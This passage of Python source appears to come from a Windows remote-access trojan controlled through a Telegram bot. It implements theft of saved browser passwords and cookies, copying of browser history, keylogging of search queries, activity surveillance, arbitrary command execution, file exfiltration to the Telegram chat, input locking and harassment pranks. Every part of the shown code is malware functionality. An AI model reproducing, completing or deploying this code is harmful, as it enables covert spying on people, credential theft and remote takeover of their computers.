            self.process_list = self.list_processes()
            if not self.process_list:
                self.send_telegram_message(f"No processes found on {self.device_id}.")
                return
            message, buttons = self.format_process_table(self.process_list, page)
            keyboard = {"inline_keyboard": buttons}
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'Markdown',
                'reply_markup': json.dumps(keyboard)
            }
            requests.post(self.telegram_text_api, json=payload, timeout=5)
            self.current_page = page
            logging.info(f"Sent process table for page {page + 1} on {self.device_id}")
        except Exception as e:
            logging.error(f"Error sending process buttons: {str(e)}")
            self.send_telegram_message(f"Error sending process buttons on {self.device_id}: {str(e)}")

    def set_wallpaper(self, image_path):
        """Set the desktop wallpaper."""
        try:
            SPI_GETDESKWALLPAPER = 0x0073
            buffer = ctypes.create_unicode_buffer(260)
            ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, 260, buffer, 0)
            current_wallpaper = buffer.value
            if current_wallpaper and os.path.exists(current_wallpaper):
                try:
                    shutil.copy2(current_wallpaper, self.original_wallpaper_file)
                    logging.info(f"Saved original wallpaper: {current_wallpaper}")
                except Exception as e:
                    logging.warning(f"Failed to save original wallpaper: {str(e)}")
            max_attempts = 5
            for attempt in range(max_attempts):
                try:
                    SPI_SETDESKWALLPAPER = 20
                    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, os.path.abspath(image_path), 3)
                    logging.info(f"Wallpaper set to: {image_path}")
                    return f"Wallpaper set successfully on {self.device_id}."
                except WindowsError as e:
                    if e.winerror == 32:
                        logging.warning(f"Attempt {attempt + 1}: File in use, retrying...")
                        time.sleep(1)
                    else:
                        raise e
            raise WindowsError("Failed to set wallpaper after multiple attempts: file still in use")
        except Exception as e:
            logging.error(f"Error setting wallpaper: {str(e)}")
            return f"Error setting wallpaper on {self.device_id}: {str(e)}"

    def restore_wallpaper(self):
        """Restore the original desktop wallpaper."""
        try:
            if os.path.exists(self.original_wallpaper_file):
                max_attempts = 5
                for attempt in range(max_attempts):
                    try:
                        SPI_SETDESKWALLPAPER = 20
                        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, os.path.abspath(self.original_wallpaper_file), 3)
                        logging.info("Restored original wallpaper")
                        return f"Original wallpaper restored on {self.device_id}."
                    except WindowsError as e:
                        if e.winerror == 32:
                            logging.warning(f"Attempt {attempt + 1}: File in use, retrying...")
                            time.sleep(1)
                        else:
                            raise e
                raise WindowsError("Failed to restore wallpaper after multiple attempts: file still in use")
            else:
                logging.warning("No original wallpaper found")
                return f"No original wallpaper found to restore on {self.device_id}."
        except Exception as e:
            logging.error(f"Error restoring wallpaper: {str(e)}")
            return f"Error restoring wallpaper on {self.device_id}: {str(e)}"

    def download_photo(self, file_id):
        """Download a photo from Telegram to set as wallpaper."""
        try:
            file_info = requests.get(
                f'https://api.telegram.org/bot{self.bot_token}/getFile',
                params={'file_id': file_id},
                timeout=5
            ).json()
            if not file_info.get('ok'):
                raise Exception(f"Failed to get file info: {file_info.get('description', 'Unknown error')}")
            file_path = file_info['result']['file_path']
            file_url = f'https://api.telegram.org/file/bot{self.bot_token}/{file_path}'
            with tempfile.NamedTemporaryFile(delete=False, suffix='.jpg') as temp_file:
                response = requests.get(file_url, timeout=10, stream=True)
                response.raise_for_status()
                for chunk in response.iter_content(chunk_size=8192):
                    temp_file.write(chunk)
                temp_file_path = temp_file.name
            max_attempts = 5
            for attempt in range(max_attempts):
                try:
                    if os.path.exists(self.wallpaper_file):
                        os.remove(self.wallpaper_file)
                    shutil.move(temp_file_path, self.wallpaper_file)
                    logging.info(f"Downloaded photo to: {self.wallpaper_file}")
                    return True
                except Exception as e:
                    if isinstance(e, OSError) and e.winerror == 32:
                        logging.warning(f"Attempt {attempt + 1}: File in use, retrying...")
                        time.sleep(1)
                    else:
                        raise e
            os.remove(temp_file_path)
            raise Exception("Failed to move temp file after multiple attempts: file still in use")
        except Exception as e:
            logging.error(f"Error downloading photo: {str(e)}")
            if 'temp_file_path' in locals() and os.path.exists(temp_file_path):
                os.remove(temp_file_path)
            return False

    def show_image(self, file_id):
        """Download a photo from Telegram and display it on the screen."""
        try:
            file_info = requests.get(
                f'https://api.telegram.org/bot{self.bot_token}/getFile',
                params={'file_id': file_id},
                timeout=5
            ).json()
            if not file_info.get('ok'):
                raise Exception(f"Failed to get file info: {file_info.get('description', 'Unknown error')}")
            file_path = file_info['result']['file_path']
            file_url = f'https://api.telegram.org/file/bot{self.bot_token}/{file_path}'
            temp_image_path = os.path.join(self.data_dir, 'temp_image.jpg')
            with requests.get(file_url, timeout=10, stream=True) as response:
                response.raise_for_status()
                with open(temp_image_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
            image = Image.open(temp_image_path)
            image.show()
            logging.info(f"Displayed image: {temp_image_path}")
            os.remove(temp_image_path)
            return f"Image displayed on {self.device_id}."
        except Exception as e:
            logging.error(f"Error displaying image: {str(e)}")
            if 'temp_image_path' in locals() and os.path.exists(temp_image_path):
                os.remove(temp_image_path)
            return f"Error displaying image on {self.device_id}: {str(e)}"

    def lock_keyboard(self):
        """Lock keyboard input."""
        try:
            self.keyboard_locked = True
            ctypes.windll.user32.BlockInput(True)
            logging.info("Keyboard locked")
            return f"Keyboard locked on {self.device_id}."
        except Exception as e:
            logging.error(f"Error locking keyboard: {str(e)}")
            return f"Error locking keyboard on {self.device_id}: {str(e)}"

    def unlock_keyboard(self):
        """Unlock keyboard input."""
        try:
            self.keyboard_locked = False
            if not self.mouse_locked:
                ctypes.windll.user32.BlockInput(False)
            logging.info("Keyboard unlocked")
            return f"Keyboard unlocked on {self.device_id}."
        except Exception as e:
            logging.error(f"Error unlocking keyboard: {str(e)}")
            return f"Error unlocking keyboard on {self.device_id}: {str(e)}"

    def restrict_mouse(self):
        """Restrict mouse movement by keeping it at a fixed position."""
        try:
            screen_width, screen_height = pyautogui.size()
            fixed_position = (0, 0)  # Lock mouse to top-left corner
            while self.mouse_locked and self.running:
                pyautogui.moveTo(fixed_position[0], fixed_position[1])
                time.sleep(0.01)
        except Exception as e:
            logging.error(f"Error in restrict_mouse: {str(e)}")
            self.mouse_locked = False
            self.mouse_restrict_thread = None

    def lock_mouse(self):
        """Completely lock mouse movement and clicks."""
        try:
            if not self.mouse_locked:
                self.mouse_locked = True
                self.mouse_restrict_thread = threading.Thread(target=self.restrict_mouse, daemon=True)
                self.mouse_restrict_thread.start()
                logging.info("Mouse locked")
                return f"Mouse locked on {self.device_id}."
            return f"Mouse already locked on {self.device_id}."
        except Exception as e:
            logging.error(f"Error locking mouse: {str(e)}")
            self.mouse_locked = False
            self.mouse_restrict_thread = None
            return f"Error locking mouse on {self.device_id}: {str(e)}"

    def unlock_mouse(self):
        """Unlock mouse movement and clicks."""
        try:
            self.mouse_locked = False
            self.mouse_restrict_thread = None
            if not self.keyboard_locked:
                ctypes.windll.user32.BlockInput(False)
            logging.info("Mouse unlocked")
            return f"Mouse unlocked on {self.device_id}."
        except Exception as e:
            logging.error(f"Error unlocking mouse: {str(e)}")
            return f"Error unlocking mouse on {self.device_id}: {str(e)}"

    def restart_system(self):
        """Restart the system."""
        try:
            subprocess.run(['shutdown', '/r', '/t', '0'], check=True)
            logging.info("System restart initiated")
            return f"System restart initiated on {self.device_id}."
        except Exception as e:
            logging.error(f"Error restarting system: {str(e)}")
            return f"Error restarting system on {self.device_id}: {str(e)}"

    def shutdown_system(self):
        """Shut down the system."""
        try:
            subprocess.run(['shutdown', '/s', '/t', '0'], check=True)
            logging.info("System shutdown initiated")
            return f"System shutdown initiated on {self.device_id}."
        except Exception as e:
            logging.error(f"Error shutting down system: {str(e)}")
            return f"Error shutting down system on {self.device_id}: {str(e)}"

    def lock_screen(self):
        """Lock the screen (Windows+L)."""
        try:
            ctypes.windll.user32.LockWorkStation()
            logging.info("Screen locked")
            return f"Screen locked on {self.device_id}."
        except Exception as e:
            logging.error(f"Error locking screen: {str(e)}")
            return f"Error locking screen on {self.device_id}: {str(e)}"

    def open_url(self, url):
        """Open a URL in the default browser."""
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            subprocess.run(['start', url], shell=True, check=True)
            logging.info(f"Opened URL: {url}")
            return f"Opened URL {url} on {self.device_id}."
        except Exception as e:
            logging.error(f"Error opening URL: {str(e)}")
            return f"Error opening URL on {self.device_id}: {str(e)}"

    def send_keys(self, text):
        """Type text into the active window."""
        try:
            keyboard.write(text)
            keyboard.press_and_release('enter')
            logging.info(f"Sent keys: {text}")
            return f"Sent text '{text}' on {self.device_id}."
        except Exception as e:
            logging.error(f"Error sending keys: {str(e)}")
            return f"Error sending keys on {self.device_id}: {str(e)}"

    def get_clipboard(self):
        """Get the clipboard content."""
        try:
            win32clipboard.OpenClipboard()
            try:
                data = win32clipboard.GetClipboardData()
                logging.info("Retrieved clipboard data")
                return f"Clipboard content on {self.device_id}: {data}"
            finally:
                win32clipboard.CloseClipboard()
        except Exception as e:
            logging.error(f"Error getting clipboard: {str(e)}")
            return f"Error getting clipboard on {self.device_id}: {str(e)}"
            
    def mouse_circle(self, duration=10, speed=10):
        """🖱️ Mouse рисует круги X секунд на скорости Y (1=медленно, 100=ОЧЕНЬ БЫСТРО)"""
        try:
            screen_w, screen_h = pyautogui.size()
            center_x, center_y = screen_w // 2, screen_h // 2
            import math
            # ПРАВИЛЬНАЯ ЛОГИКА: speed 100 = МНОГО ТОЧЕК = БЫСТРО!
            steps_per_second = speed * 3  # 100 speed = 300 точек/сек = БЫСТРО!
            total_steps = int(steps_per_second * duration)
            
            start_time = time.time()
            step_delay = 1.0 / steps_per_second  # Меньше delay = БЫСТРЕЕ!
            
            for i in range(total_steps):
                if time.time() - start_time > duration:
                    break
                angle = math.radians(i * 360 / 360)  # Полный круг
                radius = self.mouse_circle_radius
                x = center_x + radius * math.cos(angle)
                y = center_y + radius * math.sin(angle)
                pyautogui.moveTo(x, y, duration=step_delay)
            
            return f"🖱️ **CIRCLE DONE** - {duration}s at speed {speed}/100! ⚡"
        except: 
            return "❌ Mouse circle failed"
            
    def rickroll(self):
        """🎵 Открывает Rick Roll на YouTube"""
        try:
            import webbrowser
            webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
            return "🎵 **RICKROLL ACTIVATED** - Never gonna give you up! 😎"
        except:
            return "❌ Rickroll failed"

    def cursorhide(self, duration=30):
        """🖱️ Скрывает курсор на X секунд"""
        try:
            import threading
            def show_cursor():
                time.sleep(duration)
                ctypes.windll.user32.ShowCursor(True)
            
            ctypes.windll.user32.ShowCursor(False)
            threading.Thread(target=show_cursor, daemon=True).start()
            return f"🖱️ **CURSOR HIDDEN** - {duration} seconds! 👻"
        except:
            return "❌ Cursor hide failed"

    def reversescreen(self):
        """🔄 Переворачивает экран на 180°"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisplayOrientation", 0, winreg.REG_DWORD, 2)  # 2 = 180°
            winreg.CloseKey(key)
            subprocess.run(['RUNDLL32.EXE', 'user32.dll,UpdatePerUserSystemParameters'], shell=True)
            return "🔄 **SCREEN REVERSED** - Upside down! 😵"
        except:
            return "❌ Screen reverse failed"

    def cmdflood(self, count=20):
        """💥 Открывает X окон CMD"""
        try:
            count = min(int(count), 50)  # Max 50
            for _ in range(count):
                subprocess.Popen('start cmd /k color a & echo HACKED! & timeout 5', shell=True)
            return f"💥 **CMD FLOOD** - {count} CMD windows opened! 🔥"
        except:
            return "❌ CMD flood failed"

    def upload_file(self, file_id):
        """📤 Скачивает файл с Telegram и сохраняет"""
        try:
            file_info = requests.get(
                f'https://api.telegram.org/bot{self.bot_token}/getFile',
                params={'file_id': file_id}
            ).json()
            if not file_info.get('ok'):
                return "❌ Failed to get file info"
            
            file_path = file_info['result']['file_path']
            file_url = f'https://api.telegram.org/file/bot{self.bot_token}/{file_path}'
            
            local_path = os.path.join(self.temp_dir, f"uploaded_{int(time.time())}.jpg")
            response = requests.get(file_url)
            with open(local_path, 'wb') as f:
                f.write(response.content)
            
            return f"📤 **FILE UPLOADED** - Saved to: {local_path}"
        except Exception as e:
            return f"❌ Upload failed: {str(e)}"

    def passwordsteal(self):
        """🔑 Крадет пароли из Chrome/Edge"""
        try:
            passwords = self.get_browser_passwords()
            if not passwords:
                return "🔑 **No passwords found**"
            
            message = f"🔑 **{len(passwords)} PASSWORDS STOLEN**:\n"
            for i, pwd in enumerate(passwords[:10], 1):  # Top 10
                message += f"{i}. {pwd}\n"
            if len(passwords) > 10:
                message += f"... and {len(passwords)-10} more!"
            
            return message
        except:
            return "❌ Password steal failed"

    def cookiesteal(self):
        """🍪 Крадет куки из Chrome/Edge"""
        try:
            cookies = self.get_browser_cookies()
            if not cookies:
                return "🍪 **No cookies found**"
            
            message = f"🍪 **{len(cookies)} COOKIES STOLEN**:\n"
            for i, cookie in enumerate(cookies[:10], 1):  # Top 10
                host = cookie.split('| Host: ')[1].split(' |')[0] if '| Host: ' in cookie else 'Unknown'
                message += f"{i}. {host}\n"
            if len(cookies) > 10:
                message += f"... and {len(cookies)-10} more!"
            
            return message
        except:
            return "❌ Cookie steal failed"

    def browserhistory(self):
        """🌐 Крадет историю браузера"""
        try:
            history = []
            browsers = self.get_browser_paths()
            
            for browser, path in browsers.items():
                if os.path.exists(path):
                    profiles = ['Default']
                    for profile in profiles:
                        history_db = os.path.join(path, profile, 'History')
                        if os.path.exists(history_db):
                            temp_db = os.path.join(self.temp_dir, f'{browser}_history')
                            shutil.copy2(history_db, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute('SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 20')
                            for row in cursor.fetchall():
                                url, title, count = row
                                if url and title:
                                    history.append(f'{browser} | {title[:50]}... | {url} | Visits: {count}')
                            conn.close()
                            os.remove(temp_db)
            
            if not history:
                return "🌐 **No browser history found**"
            
            message = f"🌐 **{len(history)} HISTORY ENTRIES**:\n"
            for i, entry in enumerate(history[:10], 1):
                message += f"{i}. {entry}\n"
            if len(history) > 10:
                message += f"... and {len(history)-10} more!"
            
            return message
        except:
            return "❌ Browser history failed"            
            
    def set_clipboard(self, text):
        """Set the clipboard content."""
        try:
            win32clipboard.OpenClipboard()
            try:
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardText(text)
                logging.info(f"Set clipboard to: {text}")
                return f"Clipboard set to '{text}' on {self.device_id}."
            finally:
                win32clipboard.CloseClipboard()
        except Exception as e:
            logging.error(f"Error setting clipboard: {str(e)}")
            return f"Error setting clipboard on {self.device_id}: {str(e)}"

    def download_file(self, file_path):
        """Download a file from the device via Telegram."""
        try:
            if not os.path.exists(file_path):
                logging.warning(f"File does not exist: {file_path}")
                return f"File {file_path} does not exist on {self.device_id}."
            if os.path.getsize(file_path) > 50 * 1024 * 1024:
                logging.warning(f"File too large: {file_path}")
                return f"File {file_path} is too large (max 50MB) on {self.device_id}."
            max_attempts = 5
            for attempt in range(max_attempts):
                try:
                    with open(file_path, 'rb') as f:
                        files = {'document': (os.path.basename(file_path), f)}
                        payload = {'chat_id': self.chat_id}
                        response = requests.post(self.telegram_file_api, data=payload, files=files, timeout=10)
                        response.raise_for_status()
                    logging.info(f"Sent file: {file_path}")
                    return f"File {file_path} sent from {self.device_id}."
                except WindowsError as e:
                    if e.winerror == 32:
                        logging.warning(f"Attempt {attempt + 1}: File in use, retrying...")
                        time.sleep(1)
                    else:
                        raise e
            raise WindowsError("Failed to send file after multiple attempts: file still in use")
        except Exception as e:
            logging.error(f"Error downloading file: {str(e)}")
            return f"Error downloading file on {self.device_id}: {str(e)}"

    def execute_cmd(self, command):
        """Execute a command in cmd."""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout or result.stderr or "No output."
            if len(output) > 4000:
                temp_file = os.path.join(self.temp_dir, f'cmd_output_{int(time.time())}.txt')
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(output)
                self.download_file(temp_file)
                os.remove(temp_file)
                logging.info(f"Command output too large, sent as file: {temp_file}")
                return f"Command executed on {self.device_id}, output sent as file."
            logging.info(f"Executed command: {command}")
            return f"Command executed on {self.device_id}:\n{output}"
        except Exception as e:
            logging.error(f"Error executing command: {str(e)}")
            return f"Error executing command on {self.device_id}: {str(e)}"

    def enable_sound(self):
        """Enable system sound."""
        try:
            pythoncom.CoInitialize()
            sessions = AudioUtilities.GetAllSessions()
            for session in sessions:
                volume = session._ctl.QueryInterface(ISimpleAudioVolume)
                volume.SetMute(0, None)
            pythoncom.CoUninitialize()
            logging.info("Sound enabled")
            return f"Sound enabled on {self.device_id}."
        except Exception as e:
            logging.error(f"Error enabling sound: {str(e)}")
            return f"Error enabling sound on {self.device_id}: {str(e)}"

    def set_volume(self, volume_level):
        """Set system volume."""
        try:
            pythoncom.CoInitialize()
            volume_level = int(volume_level)
            if not 0 <= volume_level <= 100:
                logging.warning("Volume must be between 0 and 100")
                return f"Volume must be between 0 and 100 on {self.device_id}."
            sessions = AudioUtilities.GetAllSessions()
            for session in sessions:
                volume = session._ctl.QueryInterface(ISimpleAudioVolume)
                volume.SetMasterVolume(volume_level / 100.0, None)
            pythoncom.CoUninitialize()
            logging.info(f"Volume set to {volume_level}%")
            return f"Volume set to {volume_level}% on {self.device_id}."
        except Exception as e:
            logging.error(f"Error setting volume: {str(e)}")
            return f"Error setting volume on {self.device_id}: {str(e)}"

    def mute_volume(self):
        """Mute system volume."""
        try:
            pythoncom.CoInitialize()
            sessions = AudioUtilities.GetAllSessions()
            for session in sessions:
                volume = session._ctl.QueryInterface(ISimpleAudioVolume)
                volume.SetMute(1, None)
            pythoncom.CoUninitialize()
            logging.info("Volume muted")
            return f"Volume muted on {self.device_id}."
        except Exception as e:
            logging.error(f"Error muting volume: {str(e)}")
            return f"Error muting volume on {self.device_id}: {str(e)}"

    def play_loud_sound(self):
        """Play a loud sound."""
        try:
            pythoncom.CoInitialize()
            self.set_volume(100)
            winsound.Beep(1000, 1000)
            pythoncom.CoUninitialize()
            logging.info("Played loud sound")
            return f"Played loud sound on {self.device_id}."
        except Exception as e:
            logging.error(f"Error playing loud sound: {str(e)}")
            return f"Error playing loud sound on {self.device_id}: {str(e)}"

    def enable_wifi(self):
        """Enable WiFi."""
        try:
            subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'enabled'], check=True)
            logging.info("WiFi enabled")
            return f"WiFi enabled on {self.device_id}."
        except Exception as e:
            logging.error(f"Error enabling WiFi: {str(e)}")
            return f"Error enabling WiFi on {self.device_id}: {str(e)}"

    def disable_wifi(self):
        """Disable WiFi."""
        try:
            subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'disabled'], check=True)
            logging.info("WiFi disabled")
            return f"WiFi disabled on {self.device_id}."
        except Exception as e:
            logging.error(f"Error disabling WiFi: {str(e)}")
            return f"Error disabling WiFi on {self.device_id}: {str(e)}"

    def trigger_hotkey(self, hotkey):
        """Trigger a hotkey combination."""
        try:
            keyboard.press_and_release(hotkey)
            logging.info(f"Triggered hotkey: {hotkey}")
            return f"Triggered hotkey on {self.device_id}: {hotkey}"
        except Exception as e:
            logging.error(f"Error triggering hotkey: {str(e)}")
            return f"Error triggering hotkey on {self.device_id}: {str(e)}"

    def monitor_processes(self):
        """Monitor running processes and detect specific activities."""
        while self.running:
            try:
                current_process = None
                foreground_window = ctypes.windll.user32.GetForegroundWindow()
                pid = ctypes.c_ulong()
                ctypes.windll.user32.GetWindowThreadProcessId(foreground_window, ctypes.byref(pid))
                for proc in psutil.process_iter(['name', 'pid']):
                    if proc.info['pid'] == pid.value:
                        current_process = proc.info['name'].lower()
                        break
                if current_process and current_process != self.last_process:
                    self.last_process = current_process
                    if current_process in ['chrome.exe', 'msedge.exe']:
                        activity = "Browsing"
                    elif current_process == 'cs2.exe':
                        activity = "Playing CS2"
                    else:
                        activity = f"Running {current_process}"
                    self.send_telegram_message(f"User is {activity} on {self.device_id} (Process: {current_process})")
                    logging.info(f"Detected activity: {activity}")
                time.sleep(2)
            except Exception as e:
                logging.error(f"Error monitoring processes: {str(e)}")
                time.sleep(2)

    def monitor_search(self):
        """Monitor keyboard input for search queries in browsers."""
        try:
            from ctypes import windll
        except ImportError:
            logging.error("pywin32 not installed, cannot detect keyboard layout")
            self.send_telegram_message(f"Error: pywin32 required for keyboard layout detection on {self.device_id}")
            return

        def get_key_char(key_event, layout):
            """Convert key event to character based on keyboard layout."""
            state = (ctypes.c_byte * 256)()
            user32 = windll.user32
            char_count = user32.ToUnicodeEx(
                key_event.scan_code,
                key_event.scan_code,
                state,
                ctypes.byref(ctypes.create_unicode_buffer(8)),
                8,
                0,
                layout
            )
            if char_count > 0:
                char_buffer = ctypes.create_unicode_buffer(8)
                user32.ToUnicodeEx(
                    key_event.scan_code,
                    key_event.scan_code,
                    state,
                    ctypes.byref(char_buffer),
                    8,
                    0,
                    layout
                )
                return char_buffer.value
            return None

        while self.running and not self.keyboard_locked:
            try:
                thread_id = windll.user32.GetWindowThreadProcessId(windll.user32.GetForegroundWindow(), 0)
                layout = windll.user32.GetKeyboardLayout(thread_id)
                event = keyboard.read_event(suppress=False)
                logging.debug(f"Key event: {event.name}, type: {event.event_type}, scan_code: {event.scan_code}")
                if event.event_type == keyboard.KEY_DOWN:
                    if event.name == 'enter' and self.search_buffer:
                        if self.last_process in ['chrome.exe', 'msedge.exe']:
                            self.send_telegram_message(f"Search on {self.device_id} in {self.last_process}: {self.search_buffer}")
                            logging.info(f"Search captured: {self.search_buffer}")
                        self.search_buffer = ""
                    elif event.name in ('backspace', 'delete'):
                        if self.search_buffer:
                            self.search_buffer = self.search_buffer[:-1]
                            logging.debug(f"Search buffer after backspace/delete: {self.search_buffer}")
                    elif len(event.name) == 1 or event.name in ['space']:
                        char = get_key_char(event, layout)
                        if char:
                            self.search_buffer += char
                            logging.debug(f"Search buffer updated: {self.search_buffer}")
                    if len(self.search_buffer) > 100:
                        logging.warning("Search buffer exceeded 100 chars, resetting")
                        self.search_buffer = ""
                time.sleep(0.01)
            except Exception as e:
                logging.error(f"Error monitoring search: {str(e)}")
                time.sleep(0.01)

    def sanitize_filename(self, name, for_markdown=True):
        """Очищает имя файла, экранируя специальные символы для MarkdownV2 или сохраняя оригинал для файлов."""
        try:
            import re
            sanitized = name
            # Сначала удаляем недопустимые символы, сохраняя буквы, цифры, пробелы, точки, дефисы, подчёркивания
            sanitized = re.sub(r'[^\w\s.-]', '_', sanitized)
            # Убираем лишние пробелы (заменяем на одиночные пробелы, не на подчёркивания)
            sanitized = re.sub(r'\s+', ' ', sanitized).strip()
            # Удаляем эмодзи (Unicode U+1F000 и выше)
            sanitized = re.sub(r'[\U0001F000-\U0010FFFF]', '_', sanitized)
            if for_markdown:
                # Экранируем специальные символы MarkdownV2 после очистки
                markdown_special_chars = r'([_*\[\]()~`>#+\-=|{}.!])'
                sanitized = re.sub(markdown_special_chars, r'\\\1', sanitized)
            # Ограничиваем длину имени для Markdown
            if for_markdown and len(sanitized) > 100:
                sanitized = sanitized[:97] + '...'
            return sanitized
        except Exception as e:
            logging.error(f"Ошибка при очистке имени файла {name}: {str(e)}")
            return "invalid_filename"


    def format_file_list(self, files, path):
        """Форматирует полный список файлов для отправки в Telegram."""
        try:
            if not files:
                logging.info(f"No files found in {path}")
                return f"No files found in {path} on {self.device_id}.", []
            
            # Форматируем для сообщения (с экранированием MarkdownV2)
            table_markdown = "```\n"
            table_markdown += f"{'Name':<50} {'Size':<15}\n"
            table_markdown += "-" * 65 + "\n"
            for item in files:
                sanitized_name = self.sanitize_filename(item['name'], for_markdown=True)
                table_markdown += f"{sanitized_name:<50} {item['size']:<15}\n"
            table_markdown += "```"
            
            # Форматируем для файла (без экранирования)
            table_file = f"Files in {path} on {self.device_id}:\n\n"
            table_file += f"{'Name':<50} {'Size':<15}\n"
            table_file += "-" * 65 + "\n"
            for item in files:
                sanitized_name = self.sanitize_filename(item['name'], for_markdown=False)
                table_file += f"{sanitized_name:<50} {item['size']:<15}\n"
            
            message = f"Files in {path} on {self.device_id}:\n{table_markdown}"
            logging.info(f"Formatted file list for {path}, length: {len(message)} chars, files: {len(files)}")
            return message, table_file
        except Exception as e:
            logging.error(f"Error formatting file list for {path}: {str(e)}")
            return f"Error formatting file list on {self.device_id}: {str(e)}", ""

    def list_files(self, path, page=0):
        """Возвращает список файлов в виде таблицы с кнопками и пагинацией."""
        try:
            import base64
            if not os.path.exists(path):
                return f"❌ Путь *{self.sanitize_filename(path, for_markdown=True)}* не существует на {self.device_id}."

            files = []
            try:
                for item in os.listdir(path):
                    try:
                        full_path = os.path.join(path, item)
                        if os.path.isfile(full_path):
                            size = os.path.getsize(full_path)
                            files.append({"name": item, "size": f"{size} байт", "path": full_path})
                        else:
                            files.append({"name": f"{item}/", "size": "📁 Папка", "path": full_path})
                    except (OSError, PermissionError) as e:
                        logging.warning(f"Не удалось получить информацию о {item}: {str(e)}")
                        files.append({"name": item, "size": "⚠️ Недоступно", "path": full_path})
            except (OSError, PermissionError) as e:
                logging.error(f"Ошибка при доступе к директории {path}: {str(e)}")
                return f"Ошибка при доступе к директории *{self.sanitize_filename(path, for_markdown=True)}*: {str(e)}"

            if not files:
                return f"📂 В директории `{self.sanitize_filename(path, for_markdown=True)}` нет файлов."

            # Сортировка: фото и видео вверху
            PHOTO_EXT = [".jpg", ".jpeg", ".png", ".gif"]
            VIDEO_EXT = [".mp4", ".avi", ".mov", ".mkv"]
            photos = [f for f in files if os.path.splitext(f["name"])[1].lower() in PHOTO_EXT]
            videos = [f for f in files if os.path.splitext(f["name"])[1].lower() in VIDEO_EXT]
            others = [f for f in files if f not in photos + videos]
            files = photos + videos + others

            # Пагинация
            files_per_page = 20
            start_idx = page * files_per_page
            end_idx = start_idx + files_per_page
            page_files = files[start_idx:end_idx]

            # Формируем таблицу Markdown
            table = "```\n{:<45} {:<15}\n{}\n".format("Имя файла", "Размер", "-" * 60)
            for item in page_files[:40]:
                name = (item["name"][:42] + "...") if len(item["name"]) > 45 else item["name"]
                sanitized_name = self.sanitize_filename(name, for_markdown=True)
                table += f"{sanitized_name:<45} {item['size']:<15}\n"
            table += "```"

            message = f"📂 *Файлы в директории:* `{self.sanitize_filename(path, for_markdown=True)}` (Страница {page + 1})\n{table}"
            logging.debug(f"Формируем сообщение для {path}, длина: {len(message)} символов, файлов: {len(page_files)}")

            # Проверяем длину сообщения
            if len(message) > 4000:
                temp_file = os.path.join(self.temp_dir, f'file_list_{int(time.time())}.txt')
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(f"Files in {path} on {self.device_id} (Page {page + 1}):\n\n")
                    f.write(f"{'Name':<50} {'Size':<15}\n")
                    f.write("-" * 65 + "\n")
                    for item in files:
                        name = self.sanitize_filename(item['name'], for_markdown=False)
                        f.write(f"{name:<50} {item['size']:<15}\n")
                result = self.download_file(temp_file)
                os.remove(temp_file)
                logging.info(f"Список файлов слишком длинный, отправлен как файл: {temp_file}")
                return f"Список файлов для {path} слишком длинный, отправлен как файл: {result}"

            # Создаём кнопки с индексами
            buttons = []
            for i, f in enumerate(page_files):
                if not f["name"].endswith("/"):
                    sanitized_button_text = self.sanitize_filename(f["name"][:30], for_markdown=True)
                    buttons.append([{"text": f"⬇️ {sanitized_button_text}", "callback_data": f"download_{page}_{i}"}])

            # Кнопки пагинации и скачать все
            nav_buttons = []
            encoded_path = base64.urlsafe_b64encode(path.encode('utf-8')).decode('utf-8')[:50]
            if page > 0:
                nav_buttons.append({"text": "⬅️ Предыдущая", "callback_data": f"filepage_{page-1}_{encoded_path}"})
            if end_idx < len(files):
                nav_buttons.append({"text": "➡️ Следующая", "callback_data": f"filepage_{page+1}_{encoded_path}"})
            nav_buttons.append({"text": "🔄 Обновить", "callback_data": f"refresh_{encoded_path}"})
            nav_buttons.append({"text": "📥 Скачать все", "callback_data": f"download_all_{encoded_path}"})
            if nav_buttons:
                buttons.append(nav_buttons)

            keyboard = {"inline_keyboard": buttons}
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'Markdown',
                'reply_markup': json.dumps(keyboard)
            }

            try:
                response = requests.post(self.telegram_text_api, json=payload, timeout=5)
                response.raise_for_status()
                logging.info(f"Отправлен список файлов для {path}, страница {page + 1}")
                self.current_files[page] = page_files
                self.current_path = path
                self.all_files = files  # Сохраняем все файлы для кнопки "Скачать все"
                return f"Список файлов для {path} отправлен (страница {page + 1})."
            except requests.exceptions.HTTPError as e:
                logging.error(f"HTTP ошибка при отправке списка файлов: {str(e)}")
                # Пробуем без Markdown
                message = f"Files in {path} on {self.device_id} (Page {page + 1}):\n\n"
                for item in page_files[:40]:
                    name = self.sanitize_filename(item['name'], for_markdown=False)
                    message += f"{name:<50} {item['size']:<15}\n"
                payload = {
                    'chat_id': self.chat_id,
                    'text': message,
                    'parse_mode': None,
                    'reply_markup': json.dumps({"inline_keyboard": buttons})
                }
                try:
                    response = requests.post(self.telegram_text_api, json=payload, timeout=5)
                    response.raise_for_status()
                    logging.info(f"Отправлен список файлов без Markdown для {path}")
                    self.current_files[page] = page_files
                    self.current_path = path
                    self.all_files = files
                    return f"Список файлов для {path} отправлен без Markdown."
                except requests.exceptions.HTTPError as e2:
                    logging.error(f"Не удалось отправить список файлов без Markdown: {str(e2)}")
                    temp_file = os.path.join(self.temp_dir, f'file_list_{int(time.time())}.txt')
                    with open(temp_file, 'w', encoding='utf-8') as f:
                        f.write(message)
                    result = self.download_file(temp_file)
                    os.remove(temp_file)
